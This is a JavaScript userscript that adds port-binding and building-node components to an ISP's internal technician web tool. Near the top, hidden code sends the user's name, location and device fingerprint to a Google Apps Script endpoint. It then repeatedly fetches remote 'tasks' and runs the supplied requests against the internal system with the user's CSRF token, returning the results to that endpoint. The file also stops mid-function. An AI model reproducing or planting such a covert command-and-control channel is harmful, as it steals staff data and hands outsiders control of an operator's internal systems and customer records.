/*
javascript:(function(){
	
if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.ru')||window.location.href.includes('http://inetcore.mts.ru/fix')||window.location.href.includes('http://pre.inetcore.mts.ru/fix'))){
	document.title='Inetcore+';
	*/
	let dev=false;
	let input='';
	if(dev){
		window.AppInventor={
			setWebViewString:function(str){console.log(str)},
			getWebViewString:function(){return input},
		};
	};
	
	let addCSS=document.createElement('style');/*addCSS.type='text/css';*/let myCSS=`
		.myloader{width:20px;height:20px;border:2px dashed cadetblue;border-left-color:crimson;border-right-color:coral;border-radius:50%;vertical-align:middle;margin-right:2px;animation:myloader-spinner 0.99s linear infinite;display:inline-table;}
		@keyframes myloader-spinner{to{transform:rotate(360deg)}}
		
	`;
	addCSS.appendChild(document.createTextNode(myCSS));document.head.appendChild(addCSS);
	
	/*window.AppInventor.setWebViewString('version_:FX_test_v173.e');*//*my-site-du-wrapper (download) test*/
	window.AppInventor.setWebViewString('version_:FX_test_v173.f');/*site download*//*bot test*//*bot config test*/
	
	let info={};
	info=filterAttrs(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']);
	info.visualViewport=filterAttrs(window.visualViewport,['width','height']);
	info.navigator=filterAttrs(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory');
	info.navigator.connection=filterAttrs(window.navigator.connection,'effectiveType,rtt,downlink,saveData');
	window.navigator.getBattery().then(function(obj){info.navigator.battery=filterAttrs(obj,'charging,chargingTime,dischargingTime,level');});
	function filterAttrs(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
	
	let deviceid=randcode(20);/*console.log('deviceid',deviceid);*/
	let configid='initial';/*console.log('configid',configid);*/
	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
	let timeout_getTask=60000;
	let enable_getTask=true;
	
	let username='';
	fetch('/call/main/get_user_data',{
		'method':'POST',
		'headers':{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),},
	}).then(function(resp){return resp.json()}).then(function(user_data){
		if(user_data.data.username){
			username=user_data.data.username;/*console.log('username',username);*/
			if(true/*!dev*/){
				fetch('https://script.google.com/macros/s/AKfycbxXeWzgHKLS1X0y5SCDVqmbFPkZByfUAFieB5tS-tmQ1Ns3k8zQxr8IUA/exec',{
					'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
					'body':JSON.stringify({
						obj:{
							username:username,
							deviceid:deviceid,
							latitude:user_data.data.latitude,
							longitude:user_data.data.longitude,
							date:new Date(Date.now()).toString(),
							info:info,
						},
					})
				}).then(function(obj){/*console.log(obj)*/}).catch(function(err){console.log(err)}).finally(function(){
					if(true/*username=='mypanty1'*/){
						let timer_getTask=setTimeout(getTask,timeout_getTask);
						function getTask(){
							fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec?username='+username+'&deviceid='+deviceid+'&configid='+configid,).then(function(resp){return resp.json()}).then(function(obj){
								/*console.log('getTask',obj);*/
								if(obj&&obj.config){let config=obj.config;
									if(config.configid){configid=config.configid;};
									if(config.timeout){timeout_getTask=config.timeout;};
									if(config.enable){enable_getTask=false;};
								};
								if(obj&&obj.task_id&&obj.url&&obj.method){
									let payload={
										'method':obj.method,
										'headers':{
											'Content-Type':'application/json;charset=utf-8',
											'X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
										},
									};
									if(obj.body){payload.body=obj.body;};
									fetch(obj.url,((obj.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
										/*console.log('result',result);*/
										if(result){
											fetch('https://script.google.com/macros/s/AKfycbwXqnIVkjbsBSFMlexOukcqx1OKmNbfXNOvsAgAIcqFaAvt3u9Du_uoK7xjbpSCQbdPYw/exec',{
												'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
												'body':JSON.stringify({
													username:username,
													deviceid:deviceid,
													task_id:obj.task_id,
													result:JSON.stringify(result),
												})
											}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){next();});
										}else{
											next();
										};
									}).catch(function(err){console.log(err);next();}).finally(function(){});
								}else{
									next();
								};
							}).catch(function(err){console.log(err)}).finally(function(){});
							function next(){if(enable_getTask){timer_getTask=setTimeout(getTask,timeout_getTask);}};
						};
					};
				});
			};
		};
	});
	
	document.getElementById('port-bind-user-action-template').innerHTML=`<my-port-bind-user-action v-bind="$props"/>`;
	Vue.component('my-port-bind-user-action', {
		template:`<link-block actionIcon="expand" icon="link" v-if="$root.priv('LanBillingCtl')" @block-click="openModal" :disabled="disabledLink" text="привязать лицевой счет" type="large"/>`,
		props:{
			disabled:{type:Boolean,default:false,},
			port:{type:Object,required:true,},
			status:{type:Object,required:true,},
			device:{type:Object,required:true,},
		},
		computed:{
			disabledLink(){
				return (this.port.state=='bad'||this.status.IF_ADMIN_STATUS==false||this.disabled);
			},
			deviceParams(){
				const keys='MR_ID IP_ADDRESS SYSTEM_OBJECT_ID VENDOR FIRMWARE FIRMWARE_REVISION PATCH_VERSION DEVICE_NAME';
				return weedOut(this.device,keys);
			},
			/*add portReBindData, for set-port-modal*/
			portReBindData(){
				return {
					region:this.device.REGION_ID,
					state:this.port.state,
					subscriber_list:this.port.subscriber_list,
					last_mac:this.port.last_mac,
				};
			},
		},
		methods:{
			openModal(){
				this.$root.showModal({
					title:'выбор лицевого счета',
					data:{
						portNumber:this.port.number,
						portParams:{
							SNMP_PORT_NAME:this.port.snmp_name,
							PORT_NUMBER:this.port.number,
						},
						deviceParams:this.deviceParams,
						portReBindData:this.portReBindData,/*add portReBindData, for set-port-modal*/
					},
					component:'set-port-modal',
				});
			},
		}	
	});
	
	Vue.component('set-port-modal',{/*need ref rebind + redesign*/
	  template:`
		<div class="container-fluid">
			<div class="search-ctrl box-shadow-none search-account-modal" style="height:unset;">
				<div class="input-group">
					<input id="searchPanelAccount" v-filter="'[0-9-]'" v-model.lazy="sample" @keyup.enter="searchAccount" type="text" class="form-control" placeholder="найти">
					<div class="input-group-append">
						<button v-on:click="audio" v-if="audioShow" class="btn btn-audio btn-erase" type="button"><i class="fas fa-microphone"></i></button>
						<button v-on:click="erace" class="btn btn-erase" type="button"><i class="fas fa-times"></i></button>
						<button v-on:click="searchAccount" class="btn btn-search" type="button"><i class="fas fa-search"></i></button>
					</div>
				</div>
			</div>
			<div v-if="account">
				<p class="small-text">результат поиска:</p>
				<div v-if="account.isError" v-html="account.text" class="alert alert-warning" role="alert"></div>
				<div v-else>
					<div class="account-block account-info" v-for="acc in account.data">
						<router-link class="cursor-pointer" tag="div" :to="'/'+acc.agreements.account"> 
							<div class="link-title">
								<i class="fa fa-user"></i> {{acc.agreements.account}}<i class="fa fa-chevron-right float-right"></i>
							</div>
						</router-link>
						<div v-if="acc.address" style="border: 1px solid #a2a2a2;border-radius:5px;padding:0.2em;">
							<span class="small-text">{{ shortAddress(acc.address) }}</span>
						</div>
						<div v-if="acc.phone" class="small-text">
							{{ acc.phone }}
							<span class="inscription">Телефон</span>
						</div>
						<div v-if="acc.mobile" class="small-text">
							{{ acc.mobile }}
							<span class="inscription">Телефон</span>
						</div>
						<div class="small-text">
							{{ getBalance(acc.agreements) }} &#8381;
							<span class="inscription">Баланс</span>
						</div>
						<div class="small-text">
							{{ acc.agreements.lastsum }} ₽ {{ acc.agreements.lastpaydate }}
							<span class="inscription">Последний платеж</span>
						</div>
						<div v-if="acc.agreements.isconvergent&&acc.agreements.convergentmsisdn" class="small-text">
							{{ acc.agreements.convergentmsisdn }}
							<span class="inscription">Конвергент</span>
						</div>
						<div v-if="acc.vgids.length > 0">
							<div class="form-row">
								<div class="mt-2 full-fill">учетная запись для связи:</div>
								<div class="form-group full-fill custom-control-radio" v-for="vg in acc.vgids">
									<label>
										<div class="custom-control custom-checkbox my-1 mr-sm-2">
											<input type="radio" class="custom-control-input" v-bind:disabled="loading" v-bind:id="vg.vgid" v-bind:name="acc.userid" @change="getMacList" v-bind:value="{vgid: vg.vgid, login: vg.login, serverid: vg.serverid, type_of_bind: vg.type_of_bind, agentid: vg.agentid}" v-model="resource">
											<span class="custom-control-label custom-control-empty">{{vg.login}} • {{vg.vgid}}</span>
											<div v-if="true||vg.serverid=='108'" class="full-fill">
												<button @click="activateSpd(vg.vgid)" v-bind:disabled="loading||vg.serverid!='108'" type="submit" class="btn btn-primary btn-sm" style="margin-left:20px;">активировать {{vg.vgid}}</button>
											</div>
											<div class="small-text">{{vg.accondate}}<span class="inscription"> создан</span></div>
											<div class="small-text">{{vg.tardescr}}</div>
											<div v-if="vg.addresses&&vg.addresses[0]&&(shortAddress(vg.addresses[0].address)!=shortAddress(acc.address))" class="small-text">{{shortAddress(vg.addresses[0].address)}}</div>
										</div>
									</label>
								</div>
							</div>
							
							
							<div class="container-fluid" style="border: 1px solid #a2a2a2;border-radius:5px;padding:0.2em;margin-bottom:0.2em;">
								<div class="form-row">
									<div class="form-group col-9 control">
										<div class="small-text">коммутатор</div>
										<input class="form-control form-control-sm" v-model="myparams.sw" v-filter="'[0-9\.]'" maxlength="15" placeholder="коммутатор">
									</div>
									<div class="form-group col-3 control">
										<div class="small-text">порт</div>
										<input class="form-control form-control-sm" v-model="myparams.port" v-filter="'[0-9]'" maxlength="2" placeholder="порт">
									</div>
								</div>
							</div>
							
							
							<div v-if="typeOfBind == 2" class="form-row">
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button @click="setupMacForUser()" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-3" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == 3 || typeOfBind == 6 || typeOfBind == 8" class="form-row">
								<input v-if="typeOfBind == 6" class="form-control form-control-sm mb-2" v-filter="'[0-9\.]'" v-model="client_ip" maxlength="15">
								<button @click="setBind(3)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill" type="submit">связать счет</button>
								<button v-if="typeOfBind == 8" @click="setBind(8)" v-bind:disabled="loading" class="btn mt-2 btn-primary btn-sm btn-fill" type="submit">выделить IP</button>
							</div>
							<div v-else-if="typeOfBind == 5" class="form-row">
								<button @click="setBind(3)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-1" type="submit">связать счет</button>
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button @click="insOnlyMac()" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == 7 || typeOfBind == 9" class="form-row"><!--region78, type 9-->
								<input class="form-control form-control-sm" v-model="mac.selected" v-filter="'[0-9a-fA-F\:\.]'" maxlength="23" placeholder="mac">
								<select id="macs" class="form-control form-control-sm" v-model="mac.selected">
									<option v-for="mc in mac.list">{{ mc }}</option>
								</select>
								<button v-if="typeOfBind == 7" @click="setBind(7)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">перепривязать mac</button>
								<button v-if="typeOfBind == 9" @click="setBind(9)" v-bind:disabled="loading" class="btn btn-primary btn-sm btn-fill mt-2" type="submit">связать mac</button>
							</div>
							<div v-else-if="typeOfBind == null"></div>
							<div v-else>
								<div class="alert alert-warning mt-2" role="alert">выбраная учетная запись не нуждается в привязке</div>
							</div>

					  </div>
					  <div v-else>
							<div class="alert alert-warning mt-2" role="alert">не найдено не одной учетной записи, доступной для привязки</div>
					  </div>
					</div>
					<div v-if="result" class="mt-3 response-block">
						<div v-if="result.type=='error'">
							<div v-html="result.text.slice(0,120)" class="alert alert-danger" role="alert"></div>
							<div v-if="result.contract" class="rebindme alert":class="result.alertClass" role="alert">
								<div v-if="!result.isAnonimus && result.p_account">порт занят лс {{ result.p_account }}<span v-if="result.p_flat"> кв {{ result.p_flat }}</span></div>
								<div>{{ result.alertText }}</div>
								<div v-if="result.btnText" style="text-align:right;">
									<input type="button" v-model="result.btnText" @click="reBind(result.contract,result.serverid,result.type_of_bind)">
								</div>
							</div>
							<div v-if="resultReBind">
								<div v-if="resultReBind.type=='error'" class="rebinderr alert":class="resultReBind.alertClass" role="alert">
									<div>{{ resultReBind.alertText }}</div>
									<div>{{ resultReBind.text }}</div>
								</div>
								<div v-else-if="resultReBind.InfoMessage" class="rebindok alert":class="resultReBind.alertClass" role="alert">
									<div>{{ resultReBind.alertText }}</div>
								</div>
							</div>
						</div>
						<div v-else>
							<div v-if="typeOfBind == 1 && result.code == 200 " class="alert alert-success" role="alert">лс {{ sample }} успешно привязан к порту {{ data.portNumber}} ({{ data.deviceParams.IP_ADDRESS }})</div>
							<div v-if="typeOfBind != 1 && result.InfoMessage" class="alert alert-success" role="alert" v-html="result.InfoMessage"></div>
							<div v-if="typeOfBind != 1 && result.Data">
								<div v-if="result.Data.ip" class="small-text">{{ result.Data.ip }}<span class="inscription"> ip</span></div>
								<div v-if="result.Data.gateway" class="small-text">{{ result.Data.gateway }}<span class="inscription"> шлюз</span></div>
								<div v-if="result.Data.mask" class="small-text">{{ result.Data.mask }}<span class="inscription"> маска</span></div>
							</div>
						</div>
					</div>
				</div>

			</div>
			<div v-if="loading" class="progress mt-2">
				<div class="progress-bar progress-bar-striped progress-bar-animated bg-danger w-100"></div>
			</div>
		</div>
	  `,
	  props: ['data'],
	  data: function () {
		return {
		  loading: false,
		  sample: '',
		  account: null,
		  resource: null,
		  client_ip: null,
		  mac: {list: [], selected: ''},
		  result: {},
		  resultReBind: {},/*add this*/
		  recognizer: {},
		  audioShow: false,
		  myparams:{/*add manual input*/
			  sw:'',
			  port:''
		  },
		};
	  },
	  created: function () {
		this.erace();
		this.audioSetting();
	  },
	  computed: {
		typeOfBind: function () {
		  if (this.resource && this.resource.type_of_bind) return this.resource.type_of_bind
		},
	  },
	  methods: {
		activateSpd:function(idZakaza){
			window.AppInventor.setWebViewString('sms_tel_:+79139801727');
			window.AppInventor.setWebViewString('sms_text:activatespd '+idZakaza);
			window.AppInventor.setWebViewString('sms_type:direct'/*approve*/);
		},
		shortAddress:function(addr){/*сжатие адреса для account*/
			if(addr){
				/*Россия, обл.Новосибирская, г.Новосибирск, ул.Виктора.Уса, дом.7, кв.515*/
				return addr.replace(/\d\d\d\d\d\d$/,'').replace(/[\s]/g,'.').match(/[^\s,]+/g).join(', ')
			};
		},
		clear: function () {
		  this.account = null;
		  this.resource = null;
		  this.result = {};
		  this.resultReBind = {};/*add this*/
		  this.myparams={/*add manual input*/
			  sw:this.data.deviceParams.IP_ADDRESS,
			  port:this.data.portNumber
			};
		  this.mac = {list: [], loading: false, selected: ''};
		},
		erace: function () {
		  this.sample = '';
		  this.clear();
		},
		searchAccount: function () {
		  this.clear();
		  self = this;
		  self.loading = true;
		  httpGet('/call/lbsv/search?text=' + this.sample + '&type=account&city=any').then(function(data) {
			if (data.type == "single") data.data = [data.data];
			var searched = [];
			if (!data.isError) {
			  data.data.forEach(function (acc) {
				for (var i in acc.agreements) {
				  if (acc.agreements[i].account.replace(/-/g,'') == self.sample.replace(/-|\s/g,'')) {
					acc.agreements = acc.agreements[i];
					acc.vgids = self.getInternetResources(acc.vgroups);
					searched.push(acc);
					break;
				  }
				}
			  });
			  data.data = searched;
			}
			self.account = (!data.isError && data.data.length == 0) ? {isError: true, type: "warning", text: "ЛС не найден"} : data;
			self.loading = false;
		  }, function (err) {
			self.loading = false;
		  });
		},
		getBalance: function (agreements) {
		  var minus = (agreements.balance.minus) ? '-' : '';
		  return minus + String(agreements.balance.integer) + '.' + agreements.balance.fraction;
		},
		getInternetResources: function (vgroups) {
		  var result = [];
		  vgroups.forEach(function (vg) {
			if (vg.type_of_bind != 0)
			  result.push(vg);
		  });
		  return result;
		},
		setupMacForUser: function () {
		  var params = {mac: this.mac.selected, port: this.data.portNumber, ip: this.data.deviceParams.IP_ADDRESS, account: this.sample};
		  Object.assign(params, this.resource);
		  this.serviceMixQuery('ins_mac', params);
		},
		getMacList: function () {
		  if ([2, 5, 7, 9, 10].indexOf(this.resource.type_of_bind) >= 0) {
			this.loading = true; 
			var self = this;
			var params = {port: this.data.portParams, device: this.data.deviceParams, type: 'array'};
			httpPost('/call/hdm/port_mac_show', params).then(function(data) {
			  self.mac.list = data.text;
			  self.loading = false;
			}, function(err) {
			  self.loading = false;
			});
		  };
		},
		insOnlyMac: function () {
		  var params = {mac: this.mac.selected, account: this.sample};
		  Object.assign(params, this.resource);
		  this.serviceMixQuery('ins_only_mac', params);
		},
		setBind: function (type_of_bind) {
		  var params = {
			ip: this.myparams.sw,/*add manual input*//*this.data.deviceParams.IP_ADDRESS*/ 
			port: this.myparams.port,/*add manual input*//*this.data.portNumber*/
			client_ip: this.client_ip,
			mac: this.mac.selected,
			account: this.sample 
			};
		  Object.assign(params, this.resource);
		  if (type_of_bind && params.type_of_bind != 10) params.type_of_bind = type_of_bind;
		  this.serviceMixQuery('set_bind', params, ((this.data.portReBindData)?(this.data.portReBindData):(false)));/*add this.data.portReBindData*/
		},
		serviceMixQuery: function(method, params, p_info) {/*add p_info*/
		  this.loading = true;
		  this.result = {};
		  this.resultReBind = {};/*add this*/
		  var self = this;
		  httpPost('/call/service_mix/' + method, params, true).then(function(data) {
			self.result = data;
			if (data.Data && typeof data.Data == 'string' && data.Data.split('|').length == 3 ) {
			  var connect = data.Data.split('|');
			  data.Data = { ip: connect[0], gateway: connect[1], mask: connect[2] };
			};
			/*add data.contract*/
			if(params.serverid/*=='108'*/&&p_info){
				if(data.type=='error'&&data.text&&data.text.length>0&&data.text.indexOf('Мы не можем отобрать порт у контракта ')>=0){/*Мы не можем отобрать порт у контракта 2495985 так-как он активен.*/
					data.contract=parseInt(data.text.replace('Мы не можем отобрать порт у контракта ',''),10).toString(10);/*need string*/
					data.serverid=params.serverid;
					data.type_of_bind=params.type_of_bind;
					/*var p_state=p_info.state;*/
					var anonimus=(p_info.subscriber_list[0])?false:true;
					
					data.isAnonimus=anonimus;
					if(!anonimus){
						data.p_account=p_info.subscriber_list[0].account;
						data.p_flat=p_info.subscriber_list[0].flat;
					};
					
					var d_now=Date.now();/*1593533461000*/
					/*todo активность по маку*//*var d_last=(!anonimus)?Date.parse(p_info.subscriber_list[0].last_at):d_now;*/
					var d_last=(p_info.last_mac&&p_info.last_mac.last_at)?Date.parse(p_info.last_mac.last_at.split(' ')[0].split('.').reverse().join('-')):d_now;
					var div6m=((d_now-d_last)>=15724800000)?true:false;
					var date_now_text=new Date(d_now).toISOString().slice(0,10);
					var date_last_text=new Date(d_last).toISOString().slice(0,10);
					
					if(p_info.state=='busy'||p_info.state=='hub'){
						data.alertText='последняя активность '+date_last_text;
						data.alertClass='alert-warning';
						data.btnText='все равно освободить';
					}else if(p_info.state=='closed'){
						data.alertText='договор расторгнут, порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='expired'){
						data.alertText='неактивен более 3 мес, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='double'){
						data.alertText='мак "переехал" на другой порт, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='new'){
						data.alertText='на порту новый мак, возможно порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else if(p_info.state=='free'){
						data.alertText='на порту никогда небыло активности, порт можно освободить';
						data.alertClass='alert-info';
						data.btnText='освободить';
					}else{
						data.alertText='статус порта: '+p_info.state;
						data.alertClass='alert-dark';
						data.btnText='';
					};
					window.AppInventor.setWebViewString('string_1:(error) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' contract:'+data.contract+' text:'+data.alertText+((p_info.last_mac&&p_info.last_mac.value)?(' last_mac:'+p_info.last_mac.value):('')));
				}else{
					window.AppInventor.setWebViewString('string_3:(success) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' text:'+data.InfoMessage);
				};
			}else{
				if(data.type=='error'&&data.text){
					window.AppInventor.setWebViewString('string_4:(error) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' mac:'+params.mac+' client_ip:'+params.client_ip+' serverid:'+params.serverid+' agentid:'+params.agentid+' type_of_bind:'+params.type_of_bind+' text:'+data.text);
				}else{
					window.AppInventor.setWebViewString('string_4:(success) account:'+params.account+' login:'+params.login+' id:'+params.vgid+' sw:'+params.ip+' p:'+params.port+' state:'+p_info.state+' mac:'+params.mac+' client_ip:'+params.client_ip+' serverid:'+params.serverid+' agentid:'+params.agentid+' type_of_bind:'+params.type_of_bind+' text:'+data.InfoMessage);
				};
			};
			self.loading = false;
		  }, function() { 
			self.loading = false;
			self.result = {text: "Возникла ошибка при обращении к серверу Inetcore", isError: true};
		  });
		},
		/*reBind*/
		reBind:function(contract,serverid,type_of_bind){
			var reBind_params={
				ip:this.myparams.sw,/*'10.221.153.168'*/
				port:contract,
				vgid:contract,
				serverid:serverid,/*108*/
				type_of_bind:type_of_bind,/*3*/
			};
			this.loading = true;
			this.resultReBind = {};
			var self = this;
			httpPost('/call/service_mix/set_bind', reBind_params, true).then(function(data) {
				self.resultReBind = data;
				if(data.type=='error'){
					data.alertClass='alert-warning';
					data.alertText='освободить не удалось';
					window.AppInventor.setWebViewString('string_2:(error) text:'+data.text+' sw:'+reBind_params.ip+' p:'+reBind_params.port+' id:'+reBind_params.contract);
				}else if(data.InfoMessage){
					data.alertClass='alert-success';
					data.alertText='порт освобожден!'+((data.Data.IP)?(' тут был абонент с ip:'+data.Data.IP):'');
					window.AppInventor.setWebViewString('string_2:(rebind) sw:'+reBind_params.ip+' p:'+reBind_params.port+' id:'+reBind_params.contract+' ip:'+data.Data.IP);
				};
				self.loading = false;
			},function(){ 
				self.loading = false;
				self.resultReBind = {alertText:'ошибка при обращении к серверу Inetcore', alertClass:'alert-danger'};;
			});
		},
		audioSetting: function () {
		  try {
			this.recognizer = new webkitSpeechRecognition();
			this.recognizer.interimResults = true;
			this.recognizer.lang = 'ru-RU';
			httpGet('/call/main/setup?act=audio').then((data) => {
			  if (data.data == true) this.audioShow = true;
			},
			(err) => {
			  this.audioShow = false;
			});
		  }
		  catch (e) { console.log(e) }
		},
		audio: function () {
		  document.querySelector('.btn-audio .fa-microphone').style.animation = 'bounce-in 2s infinite ease-in-out alternate';
		  var self = this;
		  this.recognizer.onresult = function (event) {
			var result = event.results[event.resultIndex];
			self.sample = result[0].transcript;
			self.sample = self.sample.replace(/[^\d|-]/g, '');
			if (result.isFinal) {
			  try {
				if (self.sample.length < 11 ) 
				  return self.account = {isError: true, type: "warning", text: "ЛС не найден"};
				else { self.searchAccount() }
			  }
			  catch (err) {
				console.log('error',err);
			  }
			  finally {
				document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			  }
			  document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			} else {
			  document.querySelector('.btn-audio .fa-microphone').style.animation = 'none';
			}
		  };
		  this.recognizer.start();
		},
	  },
	});
	
	document.getElementById('site-du-wrapper-template').innerHTML=`<my-site-du-wrapper v-bind="$props"/>`;
	Vue.component('my-site-du-wrapper',{
		template:`
			<main>
				<transition name="slide-page" mode="out-in" appear>
					<div v-if="showNav">
						<page-navbar title="домовой узел" @refresh="refresh"/>
						<card-block>
							<nav-slider :items="navItems" :loading="loading.entrances"/>
							<devider-line/>
							<info-text :title="site.address" :text="site.node"/>
							<div style="text-align:right;padding-right:1em;margin-top:-2em;">
								<span id="loader_downloadPL" class="myloader" style="display:none;"></span>
								<input type="button" id="btn_downloadPL" @click="generate(site.id)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема">
							</div>
							<devider-line/>
							<link-block text="топология сети" icon="topology" actionIcon="right-link" :to="toTopology"/>
						</card-block>
					</div>
				</transition>
				<transition name="slide-page" mode="out-in">
					<keep-alive>
						<router-view :key="$route.params.site_id+'_'+$route.name+'_'+$route.params.entrance_id" :siteProp="site" :entranceProp="currentEntrance" :loading="loading" :entrances="responses.entrances" :devices="uzelDevices" :plints="responses.plints" :racks="responses.racks" :floors="responses.floors" @load:entrances="loadEntrances" @load:floors="loadFloors" @load:racks="loadRacks" @load:plints="loadPlints" @toggle-nav="showNav=$event"/>
					</keep-alive>
				</transition>
			</main>
		`,
		props:{
			siteProp:{type:Object,default:null},
			entranceProp:{type:Object,default:null},
		},
		data(){
			return {
				site:this.siteProp,
				responses:{
					entrances:null,
					devices:null,
					floors:null,
					racks:null,
					plints:null,
				},
				loading:{
					entrances:false,
					devices:false,
					floors:false,
					racks:false,
					plints:false,
				},
				infoOpened:false,
				showNav:true,
			};
		},
		async created(){
			this.loadDevices();
			this.loadEntrances();
			this.$root.$on('building:update',()=>{
				this.loadEntrances(true);
				this.loadFloors(true);
			});
		},
		computed:{
			uzelDevices(){
				if(!this.responses.devices)return null;
				return this.responses.devices.filter(({UZEL_NAME})=>UZEL_NAME===this.site.node);
			},
			currentEntrance(){
				if(this.currentIndex===0)return null;
				const {entrances}=this.responses;
				const entrance=entrances&&entrances.find(({ENTRANCE_ID})=>ENTRANCE_ID===this.$route.params.entrance_id);
				return {...this.entranceProp,...entrance };
			},
			currentIndex(){
				const {entrance_id}=this.$route.params;
				if(!entrance_id)return 0;
				return this.navItems.findIndex(({id})=>id===entrance_id);
			},
			currentItem(){
				return this.navItems[this.currentIndex];
			},
			navItems(){
				const entrances=this.responses.entrances;
				const mainRoute={
					icon:'entrance-mini',
					name:'ДУ',
					path:{name:'site_du',params:{site_id:this.$route.params.site_id,siteProp:this.site}},
				};
				const generateEntranceRoute=(entrance)=>({
					icon:'entrance-mini',
					name:`${entrance.ENTRANCE_NO} • ${entrance.FLAT_FROM_TO} кв`,
					path:{
						name:'entrance',
						params:{
							site_id:this.$route.params.site_id,
							entrance_id:entrance.ENTRANCE_ID,
							siteProp:this.site,
							entranceProp:entrance,
						},
					},
				});
				if(!entrances&&this.entranceProp)return [mainRoute,generateEntranceRoute(this.entranceProp)];
				if(!entrances)return [mainRoute];
				const entranceRoutes=entrances.map((entrance)=>(generateEntranceRoute(entrance)));
				return [mainRoute,...entranceRoutes];
			},
			toTopology(){
				return {
					name:'net-topology',
					params:{
						id:this.site.node,
						type:'site',
						siteProp:this.site,
						entrancesProp:this.responses.entrances,
					},
				};
			},
		},
		methods:{
			generate:function(siteid){
				console.log('generate('+siteid+')');
				document.getElementById('btn_downloadPL').setAttribute('disabled','disabled');
				document.getElementById('loader_downloadPL').style.display='inline-table';
				let headers={'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),};
				let sites={};function resetSiteObj(nodes={}){return {nodes:nodes,entrances:{},racks:{},devices:{},ppanels:{},loads:{}}};
				function loader(siteid='unknown',state=true,object='unknown'){if(state){sites[siteid].loads[object]=false;}else{sites[siteid].loads[object]=true;};};
				fetch('/call/device/search',{'method':'POST','headers':headers,'body':JSON.stringify({'pattern':siteid}),}).then(resp=>resp.json()).then(function(data){
					if(data.data){
						if(data.data.type=='building'||data.data.type=='building_mu'){data.data.data=[data.data.data]};
						sites[siteid]=resetSiteObj(data.data.data);
						loader(siteid,true,'site_entrance_list_'+siteid);
						fetch('/call/device/site_flat_list',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(entrances){
							if(entrances.type=='floors'&&entrances.data.length>0){/*наличие падиков*/
								for(let entrance of entrances.data.filter(function(item){return !item.nioss_error})){/*перебор падиков*/
									sites[siteid].entrances[entrance.ENTRANCE_ID]=entrance;
									sites[siteid].entrances[entrance.ENTRANCE_ID].SITE_ID=siteid;/*костыль для таблицы*/
									loader(siteid,true,'get_nioss_object_'+entrance.ENTRANCE_ID);
									fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:entrance.ENTRANCE_ID,object:'entrance'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
										Object.assign(sites[siteid].entrances[entrance.ENTRANCE_ID],nioss_data.data);
									}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'get_nioss_object_'+entrance.ENTRANCE_ID)});
								};
							};
						}).catch(function(err){console.log(err)}).finally(function(){loader(siteid,false,'site_entrance_list_'+siteid)});
						loader(siteid,true,'devices_'+siteid);
						fetch('/call/device/devices',{'method':'POST','headers':headers,'body':JSON.stringify({'siteid':siteid}),}).then(function(resp){return resp.json()}).then(function(devices_data){let devices=devices_data.data;
							devices.map(function(device){
								sites[siteid].devices[device.DEVICE_NIOSS_ID]=device;
								loader(siteid,true,'get_nioss_object_'+device.DEVICE_NIOSS_ID);
								fetch('/call/nioss/get_nioss_object',{'method':'POST','headers':headers,'body':JSON.stringify({object_id:device.DEVICE_NIOSS_ID,object:'device'}),}).then(function(resp){return resp.json()}).then(function(nioss_data){
